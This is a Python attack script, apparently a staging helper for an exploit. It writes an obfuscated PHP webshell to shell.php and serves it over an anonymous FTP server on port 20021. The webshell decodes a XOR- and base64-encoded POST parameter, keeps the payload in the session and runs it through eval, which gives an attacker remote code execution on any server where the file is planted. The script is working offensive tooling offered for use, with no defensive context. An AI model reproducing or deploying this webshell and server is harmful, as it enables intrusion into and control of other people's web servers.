#!/usr/bin/python
#coding:utf-8

import argparse
from colorama import *
import requests
import os
import re
import socket
import time
import base64
import threading

from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

init(autoreset=True)

	
	
def WriteShell():
	shell="""
	<?php
	echo "This is Webshell!"
    session_start();
    @set_time_limit(0);
	@error_reporting(0);
    function E($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[$i+1&15];
        }
        return $D;
    }
    function Q($D){
        return base64_encode($D);
    }
    function O($D){
        return base64_decode($D);
    }
    $P='pass';
    $V='payload';
    $T='3c6e0b8a9c15224a';
    if (isset($_POST[$P])){
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V])){
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C{public function nvoke($p) {eval($p."");}}
            $R=new C();
			$R->nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        }else{
            $_SESSION[$V]=$F;
        }
    }
	?>
	"""
	with open("shell.php", 'w') as file:
		file.write(shell)
		
def OpenFTP():
	try:
		authorizer = DummyAuthorizer()
		authorizer.add_anonymous(".")
		handler = FTPHandler
		handler.authorizer = authorizer
		handler.banner = "pyftpdlib based ftpd ready."
		address = ('0.0.0.0', 20021)
		server = FTPServer(address, handler)
		server.max_cons = 256
		server.max_cons_per_ip = 5
		server.serve_forever()
		
	except Exception as e:
		print(Fore.RED+"FTP服务器启动失败！")
		pass





if __name__=="__main__":
	WriteShell()
	OpenFTP()
